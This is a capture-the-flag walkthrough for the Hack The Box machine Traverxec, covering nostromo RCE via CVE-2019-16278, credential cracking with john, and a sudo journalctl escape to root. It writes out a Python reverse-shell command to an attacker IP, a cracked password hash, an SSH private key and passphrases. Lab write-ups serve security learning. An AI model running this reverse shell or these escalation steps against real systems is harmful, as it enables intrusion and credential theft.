# Traverxec
## nmap
```
$ nmap 10.10.10.165 --top-ports 1000 --open -sV
```
![](https://i.imgur.com/jVbDrIp.png)

## nostromo
I found the suspicious service nostromo and try to google it:

![](https://i.imgur.com/sCun1g9.png)

And use the exploit by python:
```
$ python cve2019_16278.py 10.10.10.165 80 id
```
![](https://i.imgur.com/ZzIScqH.png)

According to the result, we can find this exploit can help us remote execute command(RCE).
If RCE is allowed, then we can try the reverse shell.
> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
$ python cve2019_16278.py 10.10.10.165 80 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.100\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```
Success get shell!

![](https://i.imgur.com/WaI0sjq.png)
## user
### road 1 (hole)
I have www-data permission, so I went into the nostromo folder.
In the "/var/nostromo/conf" we can found three file, in ".htpasswd" file I found user's hash password.
```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
![](https://i.imgur.com/MZg9usp.png)

Try to crack with john tool:
```
$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![](https://i.imgur.com/pXIUHH4.png)

Successful password cracking! Try it with this account secret!
```
$ su david
> password: Nowonly4me
```
Unfortunaly I can't login with david account, that seens alreay unavilable.
### road 2
Turn back to other two file, check "nhttpd.conf".
At the end of the file:
```
# HOMEDIRS [OPTIONAL]
homedirs                           /home
homedirs_public                    public_www
```
I use the address into david's folder, and found some interesting.

![](https://i.imgur.com/p9GKxGe.png)
![](https://i.imgur.com/0hI79Ca.png)

"backup-sssh-identity-files.tgz" is a zip file, I don't have the permission to write file in /home/david so:
```
$ tar zxvf backup-ssh-identity-files.tgz -C /tmp
```
Change path to /tmp:

![](https://i.imgur.com/iqKfqba.png)

After unzip are three ssh keys:
- id_rsa
    - Contain Private key
- id_rsa.pub
    - Contain Public key.
- authorized_keys
    - Trust public key list

So we check the "id_rsa" file:
```
$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```
Before crack it, we need to convert the private key into a format that john tool can recognize.
```
$ /usr/share/john/ssh2john.py id_rsa > rsa.txt
```
Ok, then we can crack it by john.
```
$ john rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![](https://i.imgur.com/7CarqZ9.png)

Now we have a new password, try to use it to login with user david.
```
$ ssh -i id_rsa david@10.10.10.165
> password: hunter
```
Success get the user permission.
## root
In david's bin folder, I found a suspecious file:

![](https://i.imgur.com/9prKoXK.png)

The last line looks like a command, google to see what journalctl is.

![](https://i.imgur.com/ZEcHBhh.png)

The point is probably to shrink the window and run the bash command? Let's try it.
First, shrink the window and use the same command:
```
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service \
```
And type bash command:
```
$ !/bin/sh
```
![](https://i.imgur.com/etsQFqg.png)

Here we have successfully obtained root.

![](https://i.imgur.com/kwd3sO7.png)
## problem
### ssh: unprotected private key file
![](https://i.imgur.com/R8OXKPW.png)
#### solution
```
$ cd ~/.ssh
$ chmod 700 id_rsa
```
